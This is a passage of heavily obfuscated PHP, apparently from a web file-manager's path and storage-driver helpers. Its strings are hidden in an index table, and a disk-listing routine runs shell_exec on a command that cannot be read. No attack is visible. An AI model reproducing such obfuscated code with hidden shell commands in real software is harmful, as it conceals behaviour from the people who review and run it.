array($äÍÉœÉµ[507] => !1, $äÍÉœÉµ[1393] => !1, $äÍÉœÉµ[504] => !1, $äÍÉœÉµ[87] => $¥ãÕüş, $äÍÉœÉµ[1290] => !1, $äÍÉœÉµ[1289] => $äÍÉœÉµ[12]); if (is_array($ˆÛØşÜ) && count($ˆÛØşÜ) == 5) { $¢ö‹×¼Ç = $äÍÉœÉµ[1394] . $ˆÛØşÜ[2] . $äÍÉœÉµ[403]; if (in_array($¢ö‹×¼Ç, $¬æŸ»èø)) { $³Åù¸ˆ¼[$äÍÉœÉµ[1290]] = $ˆÛØşÜ[1]; $³Åù¸ˆ¼[$äÍÉœÉµ[33]] = $¢ö‹×¼Ç; $³Åù¸ˆ¼[$äÍÉœÉµ[1395]] = substr($¢ö‹×¼Ç, 1, -1); $³Åù¸ˆ¼[$äÍÉœÉµ[483]] = $ˆÛØşÜ[3]; } $³Åù¸ˆ¼[$äÍÉœÉµ[1289]] = $ˆÛØşÜ[4]; } if ($³Åù¸ˆ¼[$äÍÉœÉµ[507]] == self::KOD_SOURCE) { $³Åù¸ˆ¼[$äÍÉœÉµ[483]] = intval($³Åù¸ˆ¼[$äÍÉœÉµ[483]]); $³Åù¸ˆ¼[$äÍÉœÉµ[1293]] = $³Åù¸ˆ¼[$äÍÉœÉµ[483]]; } $Î…šœúØ = array($äÍÉœÉµ[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_SHARE_OUTER, self::KOD_USER_DRIVER); $³Åù¸ˆ¼[$äÍÉœÉµ[1357]] = in_array($³Åù¸ˆ¼[$äÍÉœÉµ[33]], $Î…šœúØ); return $³Åù¸ˆ¼; } public static function isTruePath($Ø—õ¬ «) { $£”°…Ê° =& $_SERVER[¿ÈˆÑ¸ä]; if (substr($Ø—õ¬ «, 0, 1) != $£”°…Ê°[1394]) { return !0; } if (strpos($Ø—õ¬ «, $£”°…Ê°[494]) === 0) { return !0; } if (strpos($Ø—õ¬ «, $£”°…Ê°[1361]) === 0) { return !0; } if (strpos($Ø—õ¬ «, $£”°…Ê°[1396]) === 0) { return !0; } if (strpos($Ø—õ¬ «, $£”°…Ê°[1397]) === 0) { return !0; } if (strpos($Ø—õ¬ «, $£”°…Ê°[1398]) === 0) { return !0; } if (strpos($Ø—õ¬ «, $£”°…Ê°[1399]) === 0) { return !0; } return !1; } public static function clear($ŞÆ­Ñ®) { $šâˆöùƒ =& $_SERVER[¿ÈˆÑ¸ä]; $ŞÆ­Ñ® = str_replace(array($šâˆöùƒ[1183], $šâˆöùƒ[286]), $šâˆöùƒ[53], $ŞÆ­Ñ®); $ŞÆ­Ñ® = str_replace($šâˆöùƒ[98], $šâˆöùƒ[8], $ŞÆ­Ñ®); $ ã‘ ‡¼ = $šâˆöùƒ[1400]; if (substr($ŞÆ­Ñ®, 0, 3) == $šâˆöùƒ[1401]) { $ŞÆ­Ñ® = substr($ŞÆ­Ñ®, 3); } while (strstr($ŞÆ­Ñ®, $ ã‘ ‡¼)) { $ŞÆ­Ñ® = str_replace($ ã‘ ‡¼, $šâˆöùƒ[8], $ŞÆ­Ñ®); } $ŞÆ­Ñ® = preg_replace($šâˆöùƒ[1402], $šâˆöùƒ[8], $ŞÆ­Ñ®); if ($ŞÆ­Ñ® == $šâˆöùƒ[8]) { return $šâˆöùƒ[8]; } $ŞÆ­Ñ® = rtrim($ŞÆ­Ñ®, $šâˆöùƒ[8]); return $ŞÆ­Ñ®; } public static function pathTrue($¯ÆÎË‡¸) { $€Ù›öì =& $_SERVER[¿ÈˆÑ¸ä]; if (!$¯ÆÎË‡¸) { return $€Ù›öì[12]; } $¯ÆÎË‡¸ = str_replace($€Ù›öì[255], $€Ù›öì[8], str_replace($€Ù›öì[1403], $€Ù›öì[8], $¯ÆÎË‡¸)); $¯ÆÎË‡¸ = str_replace($€Ù›öì[255], $€Ù›öì[8], str_replace($€Ù›öì[1403], $€Ù›öì[8], $¯ÆÎË‡¸)); if (!strstr($¯ÆÎË‡¸, $€Ù›öì[1401])) { return $¯ÆÎË‡¸; } $å©›ÃÉ‚ = explode($€Ù›öì[8], $¯ÆÎË‡¸); foreach ($å©›ÃÉ‚ as $©‡Ääí => $ÚÑ¹«Ã¹) { if ($ÚÑ¹«Ã¹ !== $€Ù›öì[1404]) { continue; } for ($°ãÔ¤÷Ú = $©‡Ääí; $°ãÔ¤÷Ú >= 0; $°ãÔ¤÷Ú--) { if ($å©›ÃÉ‚[$°ãÔ¤÷Ú] === $€Ù›öì[10] || $å©›ÃÉ‚[$°ãÔ¤÷Ú] === $€Ù›öì[1404] || $å©›ÃÉ‚[$°ãÔ¤÷Ú] === -1) { continue; } if ($å©›ÃÉ‚[$°ãÔ¤÷Ú] === $€Ù›öì[12]) { $å©›ÃÉ‚[$©‡Ääí] = -1; break; } $å©›ÃÉ‚[$©‡Ääí] = -1; $å©›ÃÉ‚[$°ãÔ¤÷Ú] = -1; break; } } $Õ¶£æ± = array(); foreach ($å©›ÃÉ‚ as $ÚÑ¹«Ã¹) { if ($ÚÑ¹«Ã¹ !== -1) { $Õ¶£æ±[] = $ÚÑ¹«Ã¹; } } $ˆå‡‚ÀÑ = implode($€Ù›öì[8], $Õ¶£æ±); if (strpos($ˆå‡‚ÀÑ, $€Ù›öì[1405]) === 0) { $ˆå‡‚ÀÑ = $€Ù›öì[1401] . substr($ˆå‡‚ÀÑ, strlen($€Ù›öì[1405])); } return $ˆå‡‚ÀÑ; } public static function pathUrlClear($Ÿö¬¢½Œ) { $Í•º»é¥ =& $_SERVER[¿ÈˆÑ¸ä]; if (!$Ÿö¬¢½Œ) { return $Ÿö¬¢½Œ; } $Ÿö¬¢½Œ = rawurldecode($Ÿö¬¢½Œ); $Ÿö¬¢½Œ = str_replace($Í•º»é¥[1403], $Í•º»é¥[8], $Ÿö¬¢½Œ); if (strpos($Ÿö¬¢½Œ, $Í•º»é¥[76]) > 0) { $Ÿö¬¢½Œ = substr($Ÿö¬¢½Œ, 0, strpos($Ÿö¬¢½Œ, $Í•º»é¥[76])); } if (strpos($Ÿö¬¢½Œ, $Í•º»é¥[1406]) > 0) { $Ÿö¬¢½Œ = substr($Ÿö¬¢½Œ, 0, strpos($Ÿö¬¢½Œ, $Í•º»é¥[1406])); } return $Ÿö¬¢½Œ; } public static function sourceID($¤¼¶ÁÌ¹) { $³Ñœ­Ç =& $_SERVER[¿ÈˆÑ¸ä]; $ÜÚÏƒ¯ü = self::parse($¤¼¶ÁÌ¹); if ($ÜÚÏƒ¯ü[$³Ñœ­Ç[33]] !== self::KOD_SOURCE) { show_json(LNG($³Ñœ­Ç[1407]), !1); } return $ÜÚÏƒ¯ü[$³Ñœ­Ç[483]]; } public static function make($Ãşƒ·’Ş) { if (!$Ãşƒ·’Ş) { return !1; } return self::makePath(self::KOD_SOURCE, intval($Ãşƒ·’Ş)); } public static function makeShare($¹æìÅÀ, $§‡Øœ‹‚) { return self::makePath(self::KOD_SHARE_ITEM, $¹æìÅÀ, $§‡Øœ‹‚); } public static function makeFileTypePath($«ò ²ô) { return self::makePath(self::KOD_USER_FILE_TYPE, $«ò ²ô); } public static function makeFileTagPath($¿ŒÈÃıë) { return self::makePath(self::KOD_USER_FILE_TAG, $¿ŒÈÃıë); } public static function makePath($ìÁ©øî, $×úÑ†­© = '', $ıÅ©š® = '') { $ÕÊ³¥åü =& $_SERVER[¿ÈˆÑ¸ä]; $ä¬İôá = substr($ìÁ©øî, 1, -1); $û‡´¸ÌÀ = $ÕÊ³¥åü[1408] . $ä¬İôá . $ÕÊ³¥åü[1409] . $×úÑ†­© . $ÕÊ³¥åü[1410]; $û‡´¸ÌÀ = $ıÅ©š® ? $û‡´¸ÌÀ . $ıÅ©š® . $ÕÊ³¥åü[8] : $û‡´¸ÌÀ; return $û‡´¸ÌÀ; } public static function hashPath($«—–³Ç®, $ğ›üèÄ = false) { $àÙ¼¦Úé =& $_SERVER[¿ÈˆÑ¸ä]; if (!$«—–³Ç®) { return $àÙ¼¦Úé[12]; } $à·ºèúä = is_array($«—–³Ç®) ? $«—–³Ç® : IO::info($«—–³Ç®); $ŠŒÄêÌú = _get($à·ºèúä, $àÙ¼¦Úé[1411], $àÙ¼¦Úé[12]); if (!$ŠŒÄêÌú && isset($à·ºèúä[$àÙ¼¦Úé[553]])) { $ŠŒÄêÌú = $à·ºèúä[$àÙ¼¦Úé[553]]; } if (!$ŠŒÄêÌú && isset($à·ºèúä[$àÙ¼¦Úé[236]])) { $ŠŒÄêÌú = trim($à·ºèúä[$àÙ¼¦Úé[236]], $àÙ¼¦Úé[119]); } if ($ŠŒÄêÌú) { return $ŠŒÄêÌú; } if (!$ŠŒÄêÌú && isset($à·ºèúä[$àÙ¼¦Úé[192]]) && $à·ºèúä[$àÙ¼¦Úé[192]]) { $à·ºèúä = IO::info(KodIO::make($à·ºèúä[$àÙ¼¦Úé[192]])); $ŠŒÄêÌú = _get($à·ºèúä, $àÙ¼¦Úé[1411], $àÙ¼¦Úé[12]); if (!$ŠŒÄêÌú && isset($à·ºèúä[$àÙ¼¦Úé[553]])) { $ŠŒÄêÌú = $à·ºèúä[$àÙ¼¦Úé[553]]; } } $µ¬‡éèä = md5($à·ºèúä[$àÙ¼¦Úé[87]] . $à·ºèúä[$àÙ¼¦Úé[79]] . $à·ºèúä[$àÙ¼¦Úé[88]]); $·›ˆıÔÊ = $µ¬‡éèä . $àÙ¼¦Úé[1412]; $ŠŒÄêÌú = $ŠŒÄêÌú ? $ŠŒÄêÌú : Cache::get($·›ˆıÔÊ); if (!$ŠŒÄêÌú && $ğ›üèÄ) { $ŠŒÄêÌú = IO::hashSimple($à·ºèúä[$àÙ¼¦Úé[87]]); Cache::set($·›ˆıÔÊ, $ŠŒÄêÌú ? $ŠŒÄêÌú : $µ¬‡éèä, 3600 * 24 * 30); } return $ŠŒÄêÌú ? $ŠŒÄêÌú : $µ¬‡éèä; } public static function hashPathSafe($Ğ¶ö‹È, $‰¸êöòº = false) { $Šâ¥×¦“ =& $_SERVER[¿ÈˆÑ¸ä]; $ºï¬á = self::hashPath($Ğ¶ö‹È, $‰¸êöòº); return md5($ºï¬á . $Šâ¥×¦“[1413] . Model($Šâ¥×¦“[856])->get($Šâ¥×¦“[857])); } public static function initSystemPath() { $é’Ÿó×© =& $_SERVER[¿ÈˆÑ¸ä]; if (defined($é’Ÿó×©[1414])) { return; } define($é’Ÿó×©[1414], self::systemPath($é’Ÿó×©[190])); define($é’Ÿó×©[1415], self::systemPath($é’Ÿó×©[1416])); define($é’Ÿó×©[1417], self::systemPath($é’Ÿó×©[1418])); define($é’Ÿó×©[1419], self::systemPath($é’Ÿó×©[1420])); IOHistory::bindEvent(); } public static function systemPath($›•§åÌ) { $¢¼–öşŒ =& $_SERVER[¿ÈˆÑ¸ä]; $ò²†‹æ = $¢¼–öşŒ[1421] . ucfirst($›•§åÌ); $ «¨Ê = Model($¢¼–öşŒ[856])->get($ò²†‹æ); if ($ «¨Ê) { return $ «¨Ê; } if ($›•§åÌ == $¢¼–öşŒ[190]) { $ «¨Ê = self::make(Model($¢¼–öşŒ[916])->systemRootPathAdd($¢¼–öşŒ[624])); } else { $ «¨Ê = self::systemPath($¢¼–öşŒ[190]); $°¨³Ú¼Æ = self::sourceID($ «¨Ê); $ «¨Ê = self::make(Model($¢¼–öşŒ[916])->mkdir($°¨³Ú¼Æ, $›•§åÌ)); } Model($¢¼–öşŒ[856])->set($ò²†‹æ, $ «¨Ê); return $ «¨Ê; } public static function systemFolder($çÑÇõ¸µ) { $¨ÜŒ‘¾± = IO_PATH_SYSTEM_SOURCE . $çÑÇõ¸µ; $‚†®€„î = Cache::get($¨ÜŒ‘¾±); if (!$‚†®€„î) { $Ã²ıÈÚŸ = IO::infoFullSimple($¨ÜŒ‘¾±); if (!$Ã²ıÈÚŸ) { $‚†®€„î = IO::mkdir($¨ÜŒ‘¾±, REPEAT_SKIP); } else { $‚†®€„î = $Ã²ıÈÚŸ[$_SERVER[¿ÈˆÑ¸ä][87]]; } Cache::set($¨ÜŒ‘¾±, $‚†®€„î, 3600 * 10); } return $‚†®€„î; } public static function defaultDriver() { return Model($_SERVER[¿ÈˆÑ¸ä][851])->defaultDriver(); } public static function defaultDriverInit() { $¾ƒ‡í =& $_SERVER[¿ÈˆÑ¸ä]; static $‘§š‹û = false; if ($‘§š‹û) { return $‘§š‹û; } $ûŞ³Àè  = self::defaultDriver(); $‘§š‹û = IO::init($¾ƒ‡í[1422] . $ûŞ³Àè [$¾ƒ‡í[483]] . $¾ƒ‡í[1410]); return $‘§š‹û; } public static function fileTypeList() { $æ×’ºğº =& $_SERVER[¿ÈˆÑ¸ä]; $»Ó´‰’ = $GLOBALS[$æ×’ºğº[6]][$æ×’ºğº[1423]]; foreach ($»Ó´‰’ as $Ã Åå¯Â => $•†¦İøì) { $‡“ß¢ı½ = $æ×’ºğº[1424] . $Ã Åå¯Â; $ÉŒÌâ™Ã = LNG($‡“ß¢ı½); if ($‡“ß¢ı½ != $ÉŒÌâ™Ã) { $»Ó´‰’[$Ã Åå¯Â][$æ×’ºğº[32]] = $ÉŒÌâ™Ã; } } return $»Ó´‰’; } public static function ioFileDriverGet($•ÈÄ£í = '') { $‹„Æù½¹ =& $_SERVER[¿ÈˆÑ¸ä]; static $Í§˜İÀä = array(); static $æ¦Ü÷ëí = array(); static $­Ãñ–‹× = array(); static $Ğ‘ÈÑôŞ = false; if ($Ğ‘ÈÑôŞ === !1) { $Ğ‘ÈÑôŞ = array($‹„Æù½¹[594] => array(), $‹„Æù½¹[681] => array()); $ÑêÖæè— = Model($‹„Æù½¹[1425])->get(!1, $‹„Æù½¹[1426]); foreach ($ÑêÖæè— as $ÂıÎÕ©É => $º´úÊ°Š) { if (!$º´úÊ°Š || $º´úÊ°Š == $‹„Æù½¹[12]) { continue; } if (strstr($ÂıÎÕ©É, $‹„Æù½¹[1427])) { $¨¨üõ¾¼ = str_replace($‹„Æù½¹[1427], $‹„Æù½¹[12], $ÂıÎÕ©É); $Ğ‘ÈÑôŞ[$‹„Æù½¹[594]][$¨¨üõ¾¼] = $º´úÊ°Š; } else { if (strstr($ÂıÎÕ©É, $‹„Æù½¹[1428])) { $¨¨üõ¾¼ = str_replace($‹„Æù½¹[1428], $‹„Æù½¹[12], $ÂıÎÕ©É); $Ğ‘ÈÑôŞ[$‹„Æù½¹[681]][$¨¨üõ¾¼] = $º´úÊ°Š; } } } } $§×ï’Òı = self::defaultDriver(); if (!$•ÈÄ£í || !$Ğ‘ÈÑôŞ[$‹„Æù½¹[594]] && !$Ğ‘ÈÑôŞ[$‹„Æù½¹[681]]) { return $§×ï’Òı; } $†ƒğÉô‡ = self::getPathSourceID($•ÈÄ£í); if (!$†ƒğÉô‡) { return $§×ï’Òı; } if (isset($Í§˜İÀä[$†ƒğÉô‡])) { return $Í§˜İÀä[$†ƒğÉô‡]; } $ù…°İ¿â = Model($‹„Æù½¹[916])->sourceInfo($†ƒğÉô‡); $öÔ¿ = $ù…°İ¿â[$‹„Æù½¹[585]]; $§‡Í¬İç = array(); if (!$ù…°İ¿â) { return $§×ï’Òı; } if ($ù…°İ¿â[$‹„Æù½¹[189]] == $‹„Æù½¹[91]) { if (isset($­Ãñ–‹×[$öÔ¿])) { return $­Ãñ–‹×[$öÔ¿]; } if (isset($Ğ‘ÈÑôŞ[$‹„Æù½¹[681]][$öÔ¿])) { $º€úà­ì = Model($‹„Æù½¹[851])->driverInfo($Ğ‘ÈÑôŞ[$‹„Æù½¹[681]][$öÔ¿]); $§×ï’Òı = $º€úà­ì ? $º€úà­ì : $§×ï’Òı; $­Ãñ–‹×[$öÔ¿] = $§×ï’Òı; $Í§˜İÀä[$†ƒğÉô‡] = $§×ï’Òı; return $§×ï’Òı; } $§‡Í¬İç = self::groupParentUser($öÔ¿); } else { if ($ù…°İ¿â[$‹„Æù½¹[189]] == $‹„Æù½¹[520]) { $ØËÙı­ú = Model($‹„Æù½¹[1429])->getInfo($öÔ¿); if ($ØËÙı­ú) { $§‡Í¬İç = explode($‹„Æù½¹[50], trim($ØËÙı­ú[$‹„Æù½¹[600]], $‹„Æù½¹[50])); $§‡Í¬İç = array_remove_value($§‡Í¬İç, $‹„Æù½¹[229]); $§‡Í¬İç[] = $öÔ¿; $§‡Í¬İç = array_reverse($§‡Í¬İç); } } } foreach ($§‡Í¬İç as $Åæ¿ÀÕç) { if (!isset($Ğ‘ÈÑôŞ[$‹„Æù½¹[594]][$Åæ¿ÀÕç])) { continue; } if (isset($æ¦Ü÷ëí[$Åæ¿ÀÕç])) { return $æ¦Ü÷ëí[$Åæ¿ÀÕç]; } $º€úà­ì = Model($‹„Æù½¹[851])->driverInfo($Ğ‘ÈÑôŞ[$‹„Æù½¹[594]][$Åæ¿ÀÕç]); $§×ï’Òı = $º€úà­ì ? $º€úà­ì : $§×ï’Òı; $æ¦Ü÷ëí[$Åæ¿ÀÕç] = $§×ï’Òı; break; } if ($ù…°İ¿â[$‹„Æù½¹[189]] == $‹„Æù½¹[91]) { $­Ãñ–‹×[$öÔ¿] = $§×ï’Òı; } $Í§˜İÀä[$†ƒğÉô‡] = $§×ï’Òı; return $§×ï’Òı; } private static function getPathSourceID($üƒ­Õêº) { $ø³­› =& $_SERVER[¿ÈˆÑ¸ä]; static $ìšê«à = array(); if (!$üƒ­Õêº) { return $ø³­›[12]; } $æ÷ş‚Ú = substr($üƒ­Õêº, 0, strlen($ø³­›[494])) == $ø³­›[494]; $Ì’‘Šˆ = substr($üƒ­Õêº, 0, strlen($ø³­›[1396])) == $ø³­›[1396]; $¼ÅÇ‡à = substr($üƒ­Õêº, 0, strlen($ø³­›[1397])) == $ø³­›[1397]; if (!$æ÷ş‚Ú && !$Ì’‘Šˆ && !$¼ÅÇ‡à) { return $ø³­›[12]; } $û°ÎÜã” = self::parse($üƒ­Õêº); $ô±º‚ı = $û°ÎÜã”[$ø³­›[1290]]; if ($æ÷ş‚Ú) { return $û°ÎÜã”[$ø³­›[483]]; } if (isset($ìšê«à[$ô±º‚ı])) { $×¶¹¼×š = $ìšê«à[$ô±º‚ı]; } else { $×¶¹¼×š = IO::init($ô±º‚ı); $ìšê«à[$ô±º‚ı] = $×¶¹¼×š; } if (isset($×¶¹¼×š->pathParse[$ø³­›[1293]])) { return $×¶¹¼×š->pathParse[$ø³­›[1293]]; } return $ø³­›[12]; } private static function groupParentUser($ËÀôàŠ) { $“–ú§Äş =& $_SERVER[¿ÈˆÑ¸ä]; $·Øøäµú = Model($“–ú§Äş[613])->getInfo($ËÀôàŠ); if (!$·Øøäµú) { return array(); } $Š¶ÙÚù’ = array_to_keyvalue($·Øøäµú[$“–ú§Äş[1430]], $“–ú§Äş[12], $“–ú§Äş[1431]); $êŠ¶ÄÕö = array(); foreach ($·Øøäµú[$“–ú§Äş[1430]] as $õ¾¹Ü—£) { $êŠ¶ÄÕö[] = $õ¾¹Ü—£[$“–ú§Äş[1431]]; $…Şú¡Ø = explode($“–ú§Äş[50], trim($õ¾¹Ü—£[$“–ú§Äş[600]], $“–ú§Äş[50])); $…Şú¡Ø = array_remove_value($…Şú¡Ø, $“–ú§Äş[229]); $…Şú¡Ø = array_reverse($…Şú¡Ø); $êŠ¶ÄÕö = array_merge($êŠ¶ÄÕö, $…Şú¡Ø); } return array_unique($êŠ¶ÄÕö); } public static function diskList($‰Á¥ß³ = true) { $‹ÇĞ×ˆŞ = $_SERVER[¿ÈˆÑ¸ä][1432]; if ($‰Á¥ß³) { $ÙäÂåû = Cache::get($‹ÇĞ×ˆŞ); if (is_array($ÙäÂåû)) { return $ÙäÂåû; } } $ÙäÂåû = self::diskListGet(); Cache::set($‹ÇĞ×ˆŞ, $ÙäÂåû, 60); return $ÙäÂåû; } public static function diskListGet() { $Êè•ÔµÖ =& $_SERVER[¿ÈˆÑ¸ä]; $ĞšÓ¥û = array(); if ($GLOBALS[$Êè•ÔµÖ[6]][$Êè•ÔµÖ[1433]] == $Êè•ÔµÖ[1434]) { $¬°ºŞ§á = $Êè•ÔµÖ[1435]; for ($¯¢ñÒë½ = 0; $¯¢ñÒë½ < strlen($¬°ºŞ§á); $¯¢ñÒë½++) { $Ê‹ş¿ßÍ = $¬°ºŞ§á[$¯¢ñÒë½] . $Êè•ÔµÖ[1436]; if (file_exists($Ê‹ş¿ßÍ)) { $ĞšÓ¥û[] = $Ê‹ş¿ßÍ; } } return $ĞšÓ¥û; } if (!function_exists($Êè•ÔµÖ[99])) { $ĞšÓ¥û[] = $Êè•ÔµÖ[930]; return $ĞšÓ¥û; } $ä©‹´¼› = explode($Êè•ÔµÖ[286], shell_exec($Êè•ÔµÖ[1437])); array_shift($ä©‹´¼›); array_pop($ä©‹´¼›); $ƒù™äå = array($Êè•ÔµÖ[1438], $Êè•ÔµÖ[1439], $Êè•ÔµÖ[1440], $Êè•ÔµÖ[1441], $Êè•ÔµÖ[1442], $Êè•ÔµÖ[1443], $Êè•ÔµÖ[1444], $Êè•ÔµÖ[1445]); foreach ($ä©‹´¼› as $¯£˜ßü) { $ÀØ×§É = preg_split($Êè•ÔµÖ[1446], $¯£˜ßü); $Ê‹ş¿ßÍ = $ÀØ×§É[count($ÀØ×§É) - 1]; if (!strstr($ÀØ×§É[0], $Êè•ÔµÖ[1447]) || !$Ê‹ş¿ßÍ) { continue; } $†ğş¶Áñ = rtrim($Ê‹ş¿ßÍ, $Êè•ÔµÖ[8]) . $Êè•ÔµÖ[8]; if (in_array($†ğş¶Áñ, $ƒù™äå)) { continue; } $ĞšÓ¥û[] = $†ğş¶Áñ; } return $ĞšÓ¥û; } public static function isSameDisk($æàñü•é, $Â˜Ì´·ä) { $æ•ßÏ–Ó =& $_SERVER[¿ÈˆÑ¸ä]; if ($GLOBALS[$æ•ßÏ–Ó[6]][$æ•ßÏ–Ó[1433]] == $æ•ßÏ–Ó[1434]) { return strtolower(substr($æàñü•é, 0, 1)) == strtolower(substr($Â˜Ì´·ä, 0, 1)); } $´š²Ñ‹ = stat($æàñü•é); $ª¹Œ÷•§ = stat($Â˜Ì´·ä); if ($´š²Ñ‹ === !1 || $ª¹Œ÷•§ === !1) { return !1; } return $´š²Ñ‹[$æ•ßÏ–Ó[1448]] === $ª¹Œ÷•§[$æ•ßÏ–Ó[1448]]; $÷À†§ = self::diskList(); $Ú§©âéä = !1; $ìÒÅ²ÓÖ = !1; sort($÷À†§); $÷À†§ = array_reverse($÷À†§); $æàñü•é = rtrim($æàñü•é, $æ•ßÏ–Ó[8]) . $æ•ßÏ–Ó[8]; $Â˜Ì´·ä = rtrim($Â˜Ì´·ä, $æ•ßÏ–Ó[8]) . $æ•ßÏ–Ó[8]; foreach ($÷À†§ as $‹“éÜç) { $ø•½Ù¿€ = strlen($‹“éÜç); if (!$Ú§©âéä && substr($æàñü•é, 0, $ø•½Ù¿€) == $‹“éÜç) { $Ú§©âéä = $‹“éÜç; } if (!$ìÒÅ²ÓÖ && substr($Â˜Ì´·ä, 0, $ø•½Ù¿€) == $‹“éÜç) { $ìÒÅ²ÓÖ = $‹“éÜç; } if ($Ú§©âéä && $ìÒÅ²ÓÖ) { break; } } return $Ú§©âéä === $ìÒÅ²ÓÖ; } public static function transferType($ÅçÎ‡ïÖ, $±şñ’å†) { $ÆøæÈ¸² =& $_SERVER[¿ÈˆÑ¸ä]; $©Ş«ÄÍ£ = self::driverType($ÅçÎ‡ïÖ); $é›ô…Å† = self::driverType($±şñ’å†); if ($©Ş«ÄÍ£[$ÆøæÈ¸²[33]] == $é›ô…Å†[$ÆøæÈ¸²[33]] && $©Ş«ÄÍ£[$ÆøæÈ¸²[1449]] == $é›ô…Å†[$ÆøæÈ¸²[1449]]) { return $ÆøæÈ¸²[1450]; } if ($©Ş«ÄÍ£[$ÆøæÈ¸²[33]] == $ÆøæÈ¸²[972] && $é›ô…Å†[$ÆøæÈ¸²[33]] == $ÆøæÈ¸²[107]) { return $ÆøæÈ¸²[1318]; } if ($©Ş«ÄÍ£[$ÆøæÈ¸²[33]] == $ÆøæÈ¸²[107] && $é›ô…Å†[$ÆøæÈ¸²[33]] == $ÆøæÈ¸²[972]) { return $ÆøæÈ¸²[108]; } return $ÆøæÈ¸²[1451]; } public static function driverType($äâÂ°ç) { $¡ï÷¤üî =& $_SERVER[¿ÈˆÑ¸ä]; $İùÚ‘­ = str_replace($¡ï÷¤üî[1452], $¡ï÷¤üî[12], strtolower($äâÂ°ç->getType())); if ($İùÚ‘­ == $¡ï÷¤üî[841] || $İùÚ‘­ == $¡ï÷¤üî[1453] || $İùÚ‘­ == $¡ï÷¤üî[1454]) { $ É“•¡ú = self::ioFileDriverGet($¡ï÷¤üî[494] . $äâÂ°ç->pathParse[$¡ï÷¤üî[1293]] . $¡ï÷¤üî[403]); $äâÂ°ç = IO::init($¡ï÷¤üî[1422] . $ É“•¡ú[$¡ï÷¤üî[483]] . $¡ï÷¤üî[1410]); } else { if ($İùÚ‘­ == $¡ï÷¤üî[1328] || $İùÚ‘­ == $¡ï÷¤üî[1455]) { $äâÂ°ç = IO::init($äâÂ°ç->pathParse[$¡ï÷¤üî[1270]]); } } $±¡ä‰’Ô = $äâÂ°ç->path; $İùÚ‘­ = str_replace($¡ï÷¤üî[1452], $¡ï÷¤üî[12], strtolower($äâÂ°ç->getType())); if ($İùÚ‘­ == $¡ï÷¤üî[107]) { return array($¡ï÷¤üî[33] => $¡ï÷¤üî[107], $¡ï÷¤üî[1449] => $¡ï÷¤üî[12], $¡ï÷¤üî[87] => $±¡ä‰’Ô, $¡ï÷¤üî[96] => $äâÂ°ç); } return array($¡ï÷¤üî[33] => $¡ï÷¤üî[972], $¡ï÷¤üî[1449] => $äâÂ°ç->pathDriver, $¡ï÷¤üî[87] => $±¡ä‰’Ô, $¡ï÷¤üî[96] => $äâÂ°ç); } public static function pathDriverType($ûË¿Ó¼›) { return $ûË¿Ó¼› ? self::driverType(IO::init($ûË¿Ó¼›)) : !1; } public static function pathDriverLocal($ôôÂ«ßÒ) { $±Ó÷Éµı =& $_SERVER[¿ÈˆÑ¸ä]; $³¿Š = $ôôÂ«ßÒ ? self::driverType(IO::init($ôôÂ«ßÒ)) : !1; return strtolower($³¿Š[$±Ó÷Éµı[33]]) == $±Ó÷Éµı[107] ? !0 : !1; } public static function allowCover($¼ÅŒå«, $Âş°¯  = true) { $’¨Ö°¼ =& $_SERVER[¿ÈˆÑ¸ä]; if (is_string($¼ÅŒå«)) { $¼ÅŒå« = IO::info($¼ÅŒå«); } if (!$¼ÅŒå« || $¼ÅŒå«[$’¨Ö°¼[33]] == $’¨Ö°¼[78] || $¼ÅŒå«[$’¨Ö°¼[79]] <= 100) { return !1; } if (isset($¼ÅŒå«[$’¨Ö°¼[1456]]) || !$¼ÅŒå«[$’¨Ö°¼[87]]) { return !1; } if (isset($¼ÅŒå«[$’¨Ö°¼[233]]) && !$¼ÅŒå«[$’¨Ö°¼[233]]) { return !1; } static $Ñûº·ïæ = false; if (!$Ñûº·ïæ || !$Âş°¯ ) { $ÄéÊÊÏ = self::driverType(IO::init($¼ÅŒå«[$’¨Ö°¼[87]])); $´ı¿öî³ = $ÄéÊÊÏ[$’¨Ö°¼[96]]; $Ñûº·ïæ = $’¨Ö°¼[195]; if ($ÄéÊÊÏ[$’¨Ö°¼[33]] == $’¨Ö°¼[107]) { $Ñûº·ïæ = $’¨Ö°¼[1457]; } if ($ÄéÊÊÏ[$’¨Ö°¼[96]] && is_array($ÄéÊÊÏ[$’¨Ö°¼[96]]->config)) { $‚°½ÕÊ  = $ÄéÊÊÏ[$’¨Ö°¼[96]]->config; if (isset($‚°½ÕÊ [$’¨Ö°¼[1458]]) && $‚°½ÕÊ [$’¨Ö°¼[1458]]) { $Ñûº·ïæ = $’¨Ö°¼[1457]; } } $÷á„æŠğ = KodIO::defaultDriver(); if (strtolower($÷á„æŠğ[$’¨Ö°¼[96]]) == $’¨Ö°¼[107] && is_array($÷á„æŠğ[$’¨Ö°¼[6]])) { $×óŒ˜áŞ = $÷á„æŠğ[$’¨Ö°¼[6]][$’¨Ö°¼[1302]]; if (substr($×óŒ˜áŞ, 0, 2) == $’¨Ö°¼[1459]) { $×óŒ˜áŞ = str_replace($’¨Ö°¼[1459], BASIC_PATH, $×óŒ˜áŞ); } $×óŒ˜áŞ = str_replace($’¨Ö°¼[255], $’¨Ö°¼[8], $×óŒ˜áŞ); if (substr($¼ÅŒå«[$’¨Ö°¼[87]], 0, strlen($×óŒ˜áŞ)) == $×óŒ˜áŞ) { $Ñûº·ïæ = $’¨Ö°¼[195]; } } } return $Ñûº·ïæ == $’¨Ö°¼[1457] ? !0 : !1; } } class PathDriverBOS extends PathDriverS3 { public function __construct($„Ü÷¥ïÌ) { parent::__construct($„Ü÷¥ïÌ); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto DÓ™Í§÷ŞÚ; B´ù¹Ÿµ–â: class FileModel extends ModelBase { protected $tableName = "\x69\157\x5f\146\x69\x6c\x65"; protected $tableMeta = array("\x74\x61\x62\x6c\x65\x4e\x61\x6d\145" => "\x69\x6f\x5f\146\x69\154\145\137\155\145\164\x61", "\x6d\145\x74\x61\106\x69\145\154\x64" => "\x66\x69\154\145\x49\104"); public function fileInfo($ÁÇá…Ú˜) { $Ü™âÄ©Í =& $_SERVER[¿ÈˆÑ¸ä]; static $–¿áëøƒ = array(); if (!isset($–¿áëøƒ[$ÁÇá…Ú˜])) { $œóòè©Ğ = $Ü™âÄ©Í[2171]; $ñ¾³»ÉÌ = Model($Ü™âÄ©Í[556])->field($œóòè©Ğ)->where(array($Ü™âÄ©Í[554] => $ÁÇá…Ú˜))->find(); 